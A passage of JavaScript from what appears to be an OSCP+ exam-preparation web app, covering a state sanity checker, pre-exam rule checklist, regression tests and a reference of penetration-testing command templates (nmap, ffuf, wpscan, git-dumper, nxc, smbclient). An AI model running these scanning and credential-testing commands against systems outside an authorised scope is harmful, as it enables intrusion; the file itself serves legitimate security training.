  if(Array.isArray(ot)&&ot.length){
   targets=ot.map(upgradeV13Target);
   const map={credentials:'credentials',favorites:'favorites',preflight:'preflightData',boardConfig:'boardConfig',evidenceVault:'evidenceVault',guardConfig:'guardConfig',expertPrefs:'expertPrefs'};
   for(const [key,varName] of Object.entries(map)){try{const v=JSON.parse(localStorage.getItem('oscp_v12_'+key)||'null');if(v!==null){if(varName==='credentials')credentials=v;else if(varName==='favorites')favorites=v;else if(varName==='preflightData')preflightData=v;else if(varName==='boardConfig')boardConfig=v;else if(varName==='evidenceVault')evidenceVault=v;else if(varName==='guardConfig')guardConfig=v;else if(varName==='expertPrefs')expertPrefs=v}}catch(e){}}
   const oa=localStorage.getItem('oscp_v12_activeTarget');activeTargetId=oa&&targets.some(t=>t.id===oa)?oa:targets[0].id;
   if(!Array.isArray(credentials))credentials=[];if(!Array.isArray(favorites))favorites=[];if(!Array.isArray(evidenceVault))evidenceVault=[];
   if(preflightData!==null&&(!preflightData||typeof preflightData!=='object'||Array.isArray(preflightData)))preflightData=null;
   if(!boardConfig||typeof boardConfig!=='object'||Array.isArray(boardConfig))boardConfig={passTarget:70};
   if(!guardConfig||typeof guardConfig!=='object'||Array.isArray(guardConfig))guardConfig={entries:[],requireScope:true,checkPlaceholders:true,lhost:'',msfTargetId:''};
   if(!expertPrefs||typeof expertPrefs!=='object'||Array.isArray(expertPrefs))expertPrefs={rotation:30,break:120};
   targets.forEach(t=>{if(t.creds)sessionSecrets[t.id]=t.creds;if(!persistSecrets)t.creds=''});
   credentials.forEach(c=>{if(c.secret)sessionCredentialSecrets[c.id]=c.secret;if(!persistSecrets)c.secret=''});
   safeStoreSet(STORE+'targets',JSON.stringify(targets));safeStoreSet(STORE+'credentials',JSON.stringify(credentials.map(c=>({...c,secret:''}))));safeStoreSet(STORE+'favorites',JSON.stringify(favorites));safeStoreSet(STORE+'preflight',JSON.stringify(preflightData));safeStoreSet(STORE+'boardConfig',JSON.stringify(boardConfig));safeStoreSet(STORE+'evidenceVault',JSON.stringify(evidenceVault));safeStoreSet(STORE+'guardConfig',JSON.stringify(guardConfig));safeStoreSet(STORE+'expertPrefs',JSON.stringify(expertPrefs));safeStoreSet(STORE+'activeTarget',activeTargetId);
   toast('Legacy exam state migrated');
  }
 }catch(e){}
}

/* Missed-edge detector */
function sanityIssues(t){
 const out=[],add=(p,title,why,action='',tag='')=>out.push({p,title,why,action,tag});
 if(!t)return out;
 const ps=portSet(t),dcLike=ps.has(53)&&ps.has(88)&&ps.has(389)&&ps.has(445),web=(t.ports||[]).some(p=>p.state!=='closed'&&canonicalServiceName(p)==='WEB');
 if(dcLike&&!['dc','ad-member'].includes(t.role))add(1,'DC-like service cluster but role is not AD/DC','53 + 88 + 389 + 445 strongly indicates AD/DC context.','Switch to AD methodology and verify domain/DC/DNS/time.','[AD:FLOW]');
 if(web&&!hasSignal(t,'web'))add(2,'Web ports imported but Web surface signal is missing','The workspace state underrepresents an exposed web surface.','Mark web signal and finish minimum web coverage.','[WEB:ENUM]');
 if((ps.has(445)||ps.has(5985)||ps.has(3389)||ps.has(22))&&credentials.length&&credentialDebts().some(d=>d.t.id===t.id))add(1,'Credential material exists with untested relevant service(s)','A credential is sitting next to a reachable service without a recorded validation result.','Open Credential Debt and clear the highest-value test.','[CREDS:FANOUT]');
 if(t.status.privesc&&!t.status.proof)add(0,'PrivEsc/root state exists but proof is not banked','The technical objective may be achieved, but proof closure is incomplete.','Stop attacking and complete proof submission/evidence now.','[EVIDENCE:PACKET]');
 if(t.status.local&&!t.status.foothold)add(1,'local.txt state exists without foothold state','The state model is contradictory; local proof normally implies a foothold.','Correct workspace state before relying on automation.','[EVIDENCE:PACKET]');
 if(t.status.proof&&!t.status.privesc)add(1,'proof.txt state exists without privesc state','The state model says proof is obtained without privileged access.','Correct target state / evidence relationship.','[EVIDENCE:PACKET]');
 if((+t.pointsPossible||0)>0&&(+t.pointsAwarded||0)>(+t.pointsPossible||0))add(0,'Awarded points exceed possible points','Exam board state is internally inconsistent.','Correct the board before using points-at-risk calculations.','');
 if((t.findings||[]).some(f=>f.confidence==='exploited')&&!(t.path||[]).some(p=>p.result==='success'))add(1,'Exploited finding has no successful attack-path step','You recorded exploitation without preserving the path that produced it.','Add the successful path step while context is fresh.','');
 const proven=Object.entries(t.hypothesisState||{}).filter(([,v])=>v==='proven').map(([k])=>k);
 if(proven.length&&!((t.path||[]).some(p=>p.result==='success')||t.status.foothold||t.status.privesc))add(1,'Hypothesis marked proven but access/path state did not change','“Proven” should correspond to evidence, access, or a successful controlled primitive.','Record the resulting path/evidence or downgrade hypothesis state.','');
 const validCred=credentials.some(c=>V7_SERVICES.some(s=>['valid','admin'].includes(c.checks?.[t.id+'|'+s])));
 if(validCred&&!hasSignal(t,'creds'))add(2,'Validated credential state exists but credential signal is missing','Decision engine may under-prioritize credential reuse because the signal is absent.','Mark credential signal / re-render debt queue.','[CREDS:FANOUT]');
 if(t.role==='dc'&&!dcLike)add(2,'Target is marked DC but classic DC service cluster is incomplete','This may be valid, but verify the role was not copied from another target.','Confirm domain role with actual host/domain evidence.','[AD:FLOW]');
 if(t.stage==='complete'&&bankability(t)<90)add(0,'Target marked complete with low bankability',`Current bankability is ${bankability(t)}%.`,'Open Report Consistency and fix P0/P1 issues before counting it.','');
 if((t.ports||[]).length&&coverageStats(t).total&&coverageStats(t).pct===0)add(1,'Imported services but no minimum coverage detected','Your journal/state does not show any of the minimum per-service checks.','Run only the missing minimum checks before deeper exploitation.','');
 if((t.path||[]).some(p=>p.type==='lateral'&&p.result==='success')&&!hasSignal(t,'internal'))add(2,'Successful lateral/pivot path exists without internal-network signal','The decision engine may fail to prioritize new attack surface.','Mark internal/pivot signal and re-enumerate the new host/network.','[PIVOT:FLOW]');
 if(!out.length)add(9,'No deterministic contradiction detected','This is a sanity check, not proof that enumeration or reasoning is complete.','','');
 return out.sort((a,b)=>a.p-b.p);
}
function renderSanitySelectors(){
 const s=$('#sanityTarget');if(!s)return;s.innerHTML=targets.map(t=>`<option value="${esc(t.id)}">${esc(targetLabel(t))}</option>`).join('')||'<option value="">No targets</option>';s.value=activeTargetId||targets[0]?.id||'';
}
function renderSanity(){
 renderSanitySelectors();const t=activeTarget(),issues=sanityIssues(t),root=$('#sanityBody');if(!root||!t)return;
 const p0=issues.filter(x=>x.p===0).length,p1=issues.filter(x=>x.p===1).length,p2=issues.filter(x=>x.p===2).length;
 $('#sanityMetrics').innerHTML=`<div><b>${p0}</b><br><span class="tiny">P0 contradictions</span></div><div><b>${p1}</b><br><span class="tiny">P1 missed edges</span></div><div><b>${p2}</b><br><span class="tiny">P2 consistency hints</span></div><div><b>${coverageStats(t).pct}%</b><br><span class="tiny">minimum coverage</span></div>`;
 root.innerHTML=issues.map(x=>`<div class="sanityCard"><div class="sanityIssue ${x.p===9?'ok':'p'+x.p}"><div class="row" style="justify-content:space-between"><b>${esc(x.title)}</b><span class="chip">${x.p===9?'OK':'P'+x.p}</span></div><div class="tiny" style="margin-top:5px">${esc(x.why)}</div>${x.action?`<div style="margin-top:7px"><b>Do:</b> ${esc(x.action)}</div>`:''}${x.tag?`<button class="btn sanityTag" data-tag="${esc(x.tag)}" style="margin-top:7px">${esc(x.tag)}</button>`:''}</div></div>`).join('');
 $$('.sanityTag').forEach(b=>b.onclick=()=>{$('#globalSearch').value=b.dataset.tag;switchView('searchView');renderSearch(b.dataset.tag)});
}
$('#sanityTarget').onchange=e=>{setActiveTarget(e.target.value);renderSanity()};
$('#sanityOpenWorkspace').onclick=()=>switchView('workspaceView');

/* Freshness */
function utcDay(s){const d=new Date(s+'T00:00:00Z');return Number.isNaN(+d)?null:d}
function ageDays(s){const d=utcDay(s);return d?Math.max(0,Math.floor((Date.now()-d.getTime())/86400000)):99999}
function freshnessLevel(age,max){return age<=Math.floor(max/2)?'good':age<=max?'warn':'bad'}
function freshnessHTML(name,verified,max,detail=''){
 const age=ageDays(verified),level=freshnessLevel(age,max),pct=Math.min(100,age/max*100);
 return `<div class="freshItem"><div class="row" style="justify-content:space-between"><b>${esc(name)}</b><span class="guardStatus ${level==='good'?'ok':level==='warn'?'warn':'bad'}">${age}d old</span></div><div class="tiny">Verified ${esc(verified)} · warning threshold ${max} days${detail?' · '+esc(detail):''}</div><div class="freshBar" style="margin-top:7px"><div class="fresh${level[0].toUpperCase()+level.slice(1)}" style="width:${pct}%"></div></div></div>`;
}
const PRE_EXAM_ITEMS=[
 ['rules','Official OffSec Exam Guide/FAQ rechecked recently'],
 ['validator','Built-in functional self-tests and methodology regressions passed'],
 ['preflight','Kali tool preflight imported/reviewed'],
 ['scope','Scope allowlist configured'],
 ['lhost','Correct VPN/LHOST configured'],
 ['backup','Encrypted session backup tested'],
 ['browser','Console opened offline on the proctored exam host'],
 ['devices','Phone/tablet/other electronic devices removed or put away; no extra unshared monitor/TV'],
 ['proof','Proof/screenshot closure requirements reviewed'],
 ['clock','System clock/timezone sane'],
 ['quickcard','Simple Exam / Decision Desk opens offline and is searchable']
];
function renderFreshness(){
 const rv=freshnessState.rulesVerified||V13_RULE_DEFAULT,age=ageDays(rv);
 $('#rulesFreshness').innerHTML=freshnessHTML('OSCP+ rules / reporting requirements',rv,14,'re-check immediately before exam')+`<div class="tiny">AI/LLM prohibition, proof submission, screenshots and tool restrictions are especially rule-sensitive.</div>`;
 $('#toolFreshness').innerHTML=V13_TOOL_SNAPSHOTS.map(x=>freshnessHTML(x.name,x.verified,x.maxDays,x.tag)).join('');
 $('#preExamGate').innerHTML=PRE_EXAM_ITEMS.map(([k,l])=>`<label><input class="preExamCheck" data-pk="${k}" type="checkbox" ${preExamState[k]?'checked':''}> ${esc(l)}</label>`).join('');
 $$('.preExamCheck').forEach(x=>x.onchange=()=>{preExamState[x.dataset.pk]=x.checked;safeStoreSet(STORE+'preExam',JSON.stringify(preExamState));renderFreshness()});
 const done=PRE_EXAM_ITEMS.filter(([k])=>preExamState[k]).length,stale=age>14;
 $('#preExamSummary').innerHTML=`<b>${done}/${PRE_EXAM_ITEMS.length}</b> pre-exam checks complete.${stale?' <span class="guardStatus bad">RULE SNAPSHOT STALE — RECHECK OFFSEC</span>':''}`;
 renderOperatorFreshness();
}
$('#freshnessMarkRules').onclick=()=>{freshnessState.rulesVerified=new Date().toISOString().slice(0,10);safeStoreSet(STORE+'freshness',JSON.stringify(freshnessState));preExamState.rules=true;safeStoreSet(STORE+'preExam',JSON.stringify(preExamState));renderFreshness();toast('Rule snapshot date updated — only do this after actually rechecking official OffSec sources')};
function renderOperatorFreshness(){
 const root=$('#operatorFreshness');if(!root)return;const age=ageDays(freshnessState.rulesVerified||V13_RULE_DEFAULT),lvl=freshnessLevel(age,14),done=PRE_EXAM_ITEMS.filter(([k])=>preExamState[k]).length;
 root.innerHTML=`<div><span class="guardStatus ${lvl==='good'?'ok':lvl==='warn'?'warn':'bad'}">Rules ${age}d old</span></div><div class="tiny" style="margin-top:6px">${done}/${PRE_EXAM_ITEMS.length} pre-exam gates checked.</div><button class="btn" id="operatorOpenFresh" style="margin-top:7px">Freshness →</button>`;$('#operatorOpenFresh').onclick=()=>switchView('freshnessView');
}

/* Real-engine regression harness */
const REGRESSION_CASES=[
 {name:'Root obtained but proof not banked',expect:'attention:Bank proof evidence now',target:{ip:'10.0.0.1',role:'linux',stage:'evidence',status:{tcp:true,foothold:true,privesc:true,proof:false},signals:['linux-shell'],ports:[{port:22,proto:'tcp',state:'open',service:'ssh'}]},check:'attention',contains:'Bank proof evidence now'},
 {name:'Linux sudo clue creates rank-1 hypothesis',expect:'hypothesis:[LINUX:SUDO]',target:{ip:'10.0.0.2',role:'linux',status:{tcp:true,foothold:true},signals:['linux-shell','sudo'],ports:[{port:22,proto:'tcp',state:'open',service:'ssh'}]},check:'hyp',contains:'[LINUX:SUDO]'},
 {name:'Custom SUID creates rank-1 hypothesis',expect:'hypothesis:[LINUX:SUID]',target:{ip:'10.0.0.3',role:'linux',status:{tcp:true,foothold:true},signals:['linux-shell','suid'],ports:[{port:22,proto:'tcp',state:'open',service:'ssh'}]},check:'hyp',contains:'[LINUX:SUID]'},
 {name:'SeImpersonate creates rank-1 hypothesis',expect:'hypothesis:[WIN:SEIMPERSONATE]',target:{ip:'10.0.0.4',role:'windows',status:{tcp:true,foothold:true},signals:['windows-shell','seimp'],ports:[{port:5985,proto:'tcp',state:'open',service:'wsman'}]},check:'hyp',contains:'[WIN:SEIMPERSONATE]'},
 {name:'DC-like ports with wrong role are caught',expect:'sanity:DC-like service cluster',target:{ip:'10.0.0.5',role:'windows',status:{tcp:true},signals:[],ports:[53,88,389,445].map(port=>({port,proto:'tcp',state:'open',service:''}))},check:'sanity',contains:'DC-like service cluster'},
 {name:'Web port without web signal is caught',expect:'sanity:Web ports imported',target:{ip:'10.0.0.6',role:'unknown',status:{tcp:true},signals:[],ports:[{port:80,proto:'tcp',state:'open',service:'http'}]},check:'sanity',contains:'Web ports imported'},
 {name:'Complete target with missing closure is P0',expect:'audit:marked complete',target:{ip:'10.0.0.7',role:'linux',stage:'complete',status:{tcp:true,foothold:true,privesc:true},signals:['linux-shell'],ports:[{port:22,proto:'tcp',state:'open',service:'ssh'}]},check:'audit',contains:'marked complete'},
 {name:'Points greater than possible are caught',expect:'sanity:Awarded points exceed possible',target:{ip:'10.0.0.8',role:'unknown',pointsPossible:10,pointsAwarded:20,status:{tcp:true},signals:[],ports:[]},check:'sanity',contains:'Awarded points exceed possible'},
 {name:'Proven hypothesis without access is caught',expect:'sanity:Hypothesis marked proven',target:{ip:'10.0.0.9',role:'linux',status:{tcp:true},signals:['sudo'],hypothesisState:{sudo:'proven'},ports:[{port:22,proto:'tcp',state:'open',service:'ssh'}]},check:'sanity',contains:'Hypothesis marked proven'},
 {name:'Internal signal creates pivot hypothesis',expect:'hypothesis:[PIVOT:FLOW]',target:{ip:'10.0.0.10',role:'pivot',status:{tcp:true,foothold:true},signals:['internal'],ports:[]},check:'hyp',contains:'[PIVOT:FLOW]'},
 {name:'BloodHound signal creates ACL hypothesis',expect:'hypothesis:[AD:ACL]',target:{ip:'10.0.0.11',role:'dc',status:{tcp:true},signals:['bloodhound'],ports:[53,88,389,445].map(port=>({port,proto:'tcp',state:'open',service:''}))},check:'hyp',contains:'[AD:ACL]'},
 {name:'AD CS signal creates ADCS hypothesis',expect:'hypothesis:[AD:ADCS]',target:{ip:'10.0.0.12',role:'dc',status:{tcp:true},signals:['adcs'],ports:[53,88,389,445].map(port=>({port,proto:'tcp',state:'open',service:''}))},check:'hyp',contains:'[AD:ADCS]'},
 {name:'Root with P0 does not park',expect:'park:DO NOT PARK',target:{ip:'10.0.0.13',role:'windows',status:{tcp:true,foothold:true,privesc:true,proof:false},signals:['windows-shell'],ports:[{port:5985,proto:'tcp',state:'open',service:'wsman'}]},check:'park',contains:'DO NOT PARK'},
 {name:'Thin imported coverage is audit-visible',expect:'audit:coverage is still thin',target:{ip:'10.0.0.14',role:'web',status:{tcp:true},signals:['web'],ports:[{port:80,proto:'tcp',state:'open',service:'http'},{port:22,proto:'tcp',state:'open',service:'ssh'}],journal:[]},check:'audit',contains:'coverage is still thin'},
 {name:'local state without foothold is contradiction',expect:'sanity:local.txt state exists',target:{ip:'10.0.0.15',role:'linux',status:{tcp:true,local:true,foothold:false},signals:[],ports:[]},check:'sanity',contains:'local.txt state exists'},
 {name:'proof state without privesc is contradiction',expect:'sanity:proof.txt state exists',target:{ip:'10.0.0.16',role:'windows',status:{tcp:true,proof:true,privesc:false},signals:[],ports:[]},check:'sanity',contains:'proof.txt state exists'},
 {name:'Exploited finding without path is caught',expect:'sanity:Exploited finding has no successful',target:{ip:'10.0.0.17',role:'linux',status:{tcp:true},signals:[],findings:[{title:'x',confidence:'exploited'}],ports:[]},check:'sanity',contains:'Exploited finding has no successful'},
 {name:'Scheduled Linux signal creates systemd hypothesis',expect:'hypothesis:[LINUX:SYSTEMD]',target:{ip:'10.0.0.18',role:'linux',status:{tcp:true,foothold:true},signals:['linux-shell','systemd'],ports:[]},check:'hyp',contains:'[LINUX:SYSTEMD]'}
];
function regressionTarget(raw){
 const t=upgradeV13Target({id:'reg-'+Math.random(),host:'',notes:'',next:['','',''],findings:[],path:[],evidence:{},report:{title:'',foothold:'',privesc:'',commands:'',screens:'',remediation:''},journal:[],hypothesisState:{},pointsPossible:0,pointsAwarded:0,...raw});
 t.status={...(raw.status||{})};t.signals=[...(raw.signals||[])];t.ports=[...(raw.ports||[])];t.findings=[...(raw.findings||[])];t.path=[...(raw.path||[])];t.journal=[...(raw.journal||[])];t.hypothesisState={...(raw.hypothesisState||{})};return t;
}
function evaluateRegression(tc){
 const saved={targets,credentials,evidenceVault,activeTargetId};
 try{
  const t=regressionTarget(tc.target);targets=[t];credentials=[];evidenceVault=[];activeTargetId=t.id;
  let observed='';
  if(tc.check==='hyp')observed=hypothesisTemplates(t).map(x=>x.tag+' '+x.title).join(' | ');
  else if(tc.check==='audit')observed=consistencyAudit(t).map(x=>x.title).join(' | ');
  else if(tc.check==='sanity')observed=sanityIssues(t).map(x=>x.title).join(' | ');
  else if(tc.check==='park')observed=parkDecision(t).title+' '+parkDecision(t).why;
  else if(tc.check==='attention')observed=attentionQueue(t).map(x=>x.title).join(' | ');
  const pass=observed.toLowerCase().includes(tc.contains.toLowerCase());return {pass,observed};
 }finally{targets=saved.targets;credentials=saved.credentials;evidenceVault=saved.evidenceVault;activeTargetId=saved.activeTargetId}
}
function runRegressionSuite(){
 regressionResults=REGRESSION_CASES.map((tc,i)=>({...tc,...evaluateRegression(tc),i:i+1}));renderRegression();
}
function renderRegression(){
 const body=$('#regressionBody'),sum=$('#regressionSummary');if(!body||!sum)return;
 const pass=regressionResults.filter(x=>x.pass).length,fail=regressionResults.filter(x=>!x.pass).length,total=regressionResults.length||REGRESSION_CASES.length;
 sum.innerHTML=`<div><b>${total}</b><br><span class="tiny">cases</span></div><div><b>${pass}</b><br><span class="tiny">pass</span></div><div><b>${fail}</b><br><span class="tiny">fail</span></div><div><b>${regressionResults.length?Math.round(pass/total*100):0}%</b><br><span class="tiny">methodology regression</span></div>`;
 body.innerHTML=regressionResults.length?regressionResults.map(r=>`<tr><td>${r.i}</td><td><b>${esc(r.name)}</b></td><td>${esc(r.expect)}</td><td>${esc((r.observed||'').slice(0,360))}</td><td class="${r.pass?'regPass':'regFail'}">${r.pass?'PASS':'FAIL'}</td></tr>`).join(''):`<tr><td colspan="5" class="muted">Run the suite. It does not touch your real targets.</td></tr>`;
}
$('#runRegression').onclick=runRegressionSuite;

/* Operator integrations */
function renderOperatorSanity(){
 const root=$('#operatorSanity'),t=activeTarget();if(!root||!t)return;const items=sanityIssues(t).filter(x=>x.p<9).slice(0,5);
 root.innerHTML=items.length?items.map(x=>`<div class="sanityIssue p${x.p}"><b>P${x.p} ${esc(x.title)}</b><div class="tiny">${esc(x.action||x.why)}</div></div>`).join(''):'<span class="guardStatus ok">No deterministic contradiction detected.</span>';
}
const v13OperatorBase=renderOperator;renderOperator=function(){v13OperatorBase();renderOperatorSanity();renderOperatorFreshness()};

/* Session payload */
const v13SessionBase=sessionPayload;sessionPayload=function(includeSecrets=false){const o=v13SessionBase(includeSecrets);o.app='OSCP-V13';o.version=13;o.freshnessState=freshnessState;o.preExamState=preExamState;return o};
const v13RestoreBase=restoreV9Payload;restoreV9Payload=function(o){if(o?.freshnessState)freshnessState=o.freshnessState;if(o?.preExamState)preExamState=o.preExamState;v13RestoreBase(o);targets=targets.map(upgradeV13Target);safeStoreSet(STORE+'freshness',JSON.stringify(freshnessState));safeStoreSet(STORE+'preExam',JSON.stringify(preExamState));renderAllV13()};

function renderAllV13(){renderAllV12();renderSanity();renderRegression();renderFreshness();renderOperatorSanity()}
const v13Switch=switchView;switchView=function(id){v13Switch(id);if(id==='sanityView')renderSanity();if(id==='regressionView')renderRegression();if(id==='freshnessView')renderFreshness()};

renderAllV13();

renderAllV12();

/* ===== V14 Exam-Hardened Layer ===== */
let examClock=safeStoredRecord(STORE+'examClock',{start:''});
let revertState=safeStoredRecord(STORE+'revertState',{bankUsed:0,resetUsed:false,ledger:[]});
function normalizeRevertState(v){v=plainRecord(v)?v:{};return{...v,bankUsed:Number.isFinite(+v.bankUsed)?Math.min(24,Math.max(0,+v.bankUsed)):0,resetUsed:!!v.resetUsed,ledger:Array.isArray(v.ledger)?v.ledger.filter(plainRecord):[]}}
revertState=normalizeRevertState(revertState);
let submissionState=safeStoredRecord(STORE+'submissionState',{});

const V16_TOOL_REF=[
 {keys:['nxc','netexec'],name:'NetExec / nxc',version:'1.5.1',verified:'2026-09-16',note:'Stable release. Do not use spider_plus on versions below 1.5.1; core workflows do not require it.'},
 {keys:['bloodhound'],name:'BloodHound CE',version:'upstream stable 9.7.1 / Kali rolling 9.7.0~rc4',verified:'2026-09-23',note:'Upstream CE and Kali packaging differ. Use the installed local workflow as authority and do not upgrade a known-good exam stack merely to chase a version.'},
 {keys:['bloodhound-ce-python'],name:'BloodHound CE Python collector',version:'1.9.1',verified:'2026-08-31',note:'CE-specific collector; do not confuse with legacy bloodhound-python.'},
{keys:['rusthound-ce'],name:'RustHound-CE',version:'local -V/-h',verified:'2026-09-12',note:'Cross-platform BloodHound CE collector; use as an alternative to SharpHound or bloodhound-ce-python when it fits the foothold.'},
 {keys:['certipy','certipy-ad'],name:'Certipy AD',version:'5.1.0',verified:'2026-09-16',note:'Current stable command family; installed certipy -h/-v remains authoritative.'},
 {keys:['ligolo-proxy','ligolo-agent'],name:'Ligolo-ng',version:'0.9.1',verified:'2026-09-16',note:'Prefer certificate fingerprint validation; ignore-cert is debug fallback.'},
 {keys:['impacket','impacket-psexec'],name:'Impacket',version:'0.13.1',verified:'2026-09-16',note:'Stable release. Use Kali impacket-* wrappers; GetUserSPNs -no-rc4 is an AES fallback and dpapidump is privileged/late-stage.'},
 {keys:['evil-winrm'],name:'Evil-WinRM',version:'3.9',verified:'2026-05-25',note:'PowerShell Core/PSSession counts as an interactive shell per OffSec FAQ.'},
 {keys:['xfreerdp','xfreerdp3'],name:'FreeRDP',version:'3.30.0',verified:'2026-08-25',note:'Kali FreeRDP 3.30.0; xfreerdp3 transitional binary may exist.'},
 {keys:['chisel'],name:'Chisel',version:'1.12.0',verified:'2026-08-25',note:'Kali common binaries currently show 1.12.0-rc3.'},
 {keys:['enum4linux-ng'],name:'enum4linux-ng',version:'1.3.10',verified:'2026-09-06',note:'Current Kali package; prefer structured -oA output over the legacy wrapper.'},
 {keys:['smbmap'],name:'SMBMap',version:'1.10.7',verified:'2026-09-06',note:'Use for share permissions/content; validate access with smbclient.'},
 {keys:['bloodyAD'],name:'BloodyAD',version:'2.5.5',verified:'2026-09-06',note:'Conditional ACL helper: read/backup before minimum reversible changes.'}
];
const FALLBACK_LADDERS=[
 ['SMB auth / shares','nxc smb → smbclient → rpcclient / Impacket','Separate authentication from authorization.'],
 ['WinRM','nxc winrm → evil-winrm → PowerShell remoting / evil-winrm-py','If creds work elsewhere, check remote-management authorization.'],
 ['RDP','nxc rdp → xfreerdp / xfreerdp3','Validation failure and GUI logon authorization are different questions.'],
 ['LDAP','nxc ldap → ldapsearch → targeted Impacket/PowerView query','Fix DNS/base DN/auth context first.'],
 ['Kerberos','Impacket → Rubeus from Windows context → DNS/time/KDC checks','Clock/DNS failures are environment failures, not attack-path disproval.'],
 ['Web content','feroxbuster → ffuf/gobuster → curl/manual source/robots','Do not let one discovery tool erase application evidence.'],
 ['Pivot','Ligolo-ng → Chisel → SSH forwarding → Socat for one TCP path','Prove pivot-host reachability and route first.'],
 ['File transfer','Python HTTP server → curl/wget → WinRM transfer','Prove network reachability before changing payloads.']
];

/* Curated for exam-day questions, not for collecting tools. Commands are conservative
   starting points and placeholders must be replaced. The official rules override labels. */
const ta=(id,name,category,tier,trigger,command,fallback,rule='')=>({id,name,category,tier,trigger,command,fallback,rule});
const TOOL_ARSENAL=[
 ta('nmap','Nmap','Discovery','core','Every target: establish TCP/UDP surface, then run focused scripts/versioning.','sudo nmap -Pn -n -p- --min-rate 1000 -oA scans/tcp-all $IP\nsudo nmap -Pn -n -sC -sV -p $PORTS -oA scans/tcp-detail $IP','Verify VPN/route with ping, ip route and tcpdump; retry a small port set without aggressive timing.'),
 ta('autorecon','AutoRecon','Discovery','conditional','Background coverage after manual high-signal enumeration has started.','sudo autorecon $IP --single-target --output scans/autorecon','Nmap plus explicit service commands. Read every result before launching more scans.','Allowed-style enumeration only; inspect its configured scanners and do not let automation choose exploitation.'),
 ta('tcpdump','tcpdump','Discovery','core','A service, callback or tunnel behaves differently than expected.','sudo tcpdump -ni tun0 host $IP','Wireshark or tshark. Confirm packets leave, return, and use the expected interface.'),
 ta('wireshark','Wireshark / tshark','Discovery','core','Protocol detail matters: redirects, retransmits, DNS, SMB, Kerberos or callbacks.','tshark -ni tun0 -f "host $IP"','tcpdump for a fast CLI proof.'),
 ta('masscan','Masscan','Discovery','conditional','Only a justified larger approved range where Nmap timing is the bottleneck.','sudo masscan $CIDR -p1-65535 --rate 1000 -oL scans/masscan.txt','Nmap full-port scan. Validate every reported port with Nmap.','Do not treat high-speed discovery as a vulnerability scan; keep rate/scope conservative.'),

 ta('curl','curl','Web','core','Inspect raw responses, methods, headers, cookies, redirects and APIs.','curl -iskL --path-as-is http://$IP/','Burp Community repeater, wget or a browser.'),
 ta('openssl','OpenSSL s_client','Web','core','TLS certificate names, SNI or a raw TLS service needs validation.','openssl s_client -connect $IP:443 -servername $HOST </dev/null','Nmap ssl-cert/ssl-enum-ciphers or curl -vk.'),
 ta('whatweb','WhatWeb','Web','core','Fast technology fingerprint before content discovery.','whatweb -a 3 http://$IP | tee scans/whatweb.txt','curl headers/source plus browser devtools.'),
 ta('feroxbuster','Feroxbuster','Web','core','Recursive web content discovery, especially nested applications.','feroxbuster -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,asp,aspx,jsp,html,txt,bak -o scans/ferox.txt','ffuf or Gobuster; manually inspect robots.txt, sitemap.xml and source.'),
 ta('ffuf','FFUF','Web','core','Content, vhost, parameter or value fuzzing with precise response filters.','ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac -of md -o scans/ffuf.md','Feroxbuster, Gobuster or wfuzz. Calibrate wildcard/soft-404 behavior first.'),
 ta('gobuster','Gobuster','Web','core','Simple directory, DNS or vhost enumeration with predictable output.','gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -o scans/gobuster.txt','Feroxbuster or FFUF.'),
 ta('arjun','Arjun','Web','conditional','A dynamic endpoint works but parameter names are unknown.','arjun -u http://$IP/endpoint -oT scans/arjun.txt','FFUF parameter-name wordlist, source review and Burp requests.','Parameter discovery only; manually validate each result.'),
 ta('nikto','Nikto','Web','core','Fast web-server misconfiguration/default-file sweep after manual fingerprinting.','nikto -h http://$IP -output scans/nikto.txt','Nmap HTTP NSE, curl and content discovery.','OffSec explicitly lists Nikto as an allowed example; still inspect plugins/output and validate manually.'),
 ta('wpscan','WPScan','Web','conditional','WordPress is confirmed and versions/users/plugins need enumeration.','wpscan --url http://$HOST/ --enumerate u,ap,at --plugins-detection mixed -o scans/wpscan.txt','Manual wp-content/wp-json inspection, curl and searchsploit.','Do not use password-attack or automatic exploitation features without an explicit rule/scope decision.'),
 ta('burp','Burp Suite Community','Web','core','Manual request editing, replay, encoding, session and authorization testing.','burpsuite','curl or Caido only if the edition/features comply with current exam rules.','Use Burp Free/Community. Burp Pro is prohibited by the current guide.'),
 ta('git-dumper','git-dumper','Web','sensitive','/.git/HEAD or Git objects are exposed AND reconstructing the source is necessary to compromise this target.','git-dumper http://$IP/.git/ loot/git-repo','First confirm exposure with curl; inspect only what is necessary, then delete the local recovered copy after the objective.','Current OSCP+ guidance forbids downloading exam files/apps/source locally unless necessary to compromise the target.'),
 ta('davtest','davtest / cadaver','Web','conditional','WebDAV methods or DAV headers are exposed.','davtest -url http://$IP/\ncadaver http://$IP/','curl -X OPTIONS/PUT/MOVE and manual verification.'),
 ta('cewl','CeWL','Web','conditional','Target-specific words would improve a small, justified wordlist.','cewl -d 2 -m 5 -w loot/cewl.txt http://$IP/','Manually build words from names, source, docs and metadata.','Wordlist generation is not authorization to brute-force accounts.'),
 ta('jwt-tool','jwt_tool','Web','conditional','A JWT is present and claims/algorithm/key handling need manual validation.','python3 jwt_tool.py $TOKEN -t http://$IP/api -rh "Authorization: Bearer $TOKEN"','Decode locally with base64url; edit/replay in Burp Community.','Avoid automated attack modes; prove one exact verification flaw manually.'),

 ta('nxc','NetExec / nxc','SMB and Auth','core','Validate credentials and enumerate protocol-specific access without assuming admin rights.','nxc smb $IP -u "$USER" -p "$PASS" --shares','smbclient/rpcclient for SMB; native/Impacket client for the exact protocol.'),
 ta('smbclient','smbclient','SMB and Auth','core','List, browse and transfer files from SMB shares.','smbclient -L //$IP/ -N\nsmbclient //$IP/$SHARE -U "$DOMAIN/$USER"  # password prompt','smbmap, mount.cifs or NetExec.'),
 ta('smbclient-ng','smbclient-ng','SMB and Auth','conditional','A readable share is large/deep and faster interactive tree/recursive retrieval would save time.','smbclient-ng -h','smbclient recurse/prompt off/mget, smbmap, NetExec or Impacket smbclient.','Confirm the installed command name/syntax with -h first; use only on already-authorized shares and download only files necessary for the objective.'),
 ta('smbmap','SMBMap','SMB and Auth','core','Quickly map share permissions and recursively inspect an accessible share.','smbmap -H $IP -u "$USER" -p "$PASS" -d "$DOMAIN"','smbclient plus rpcclient.'),
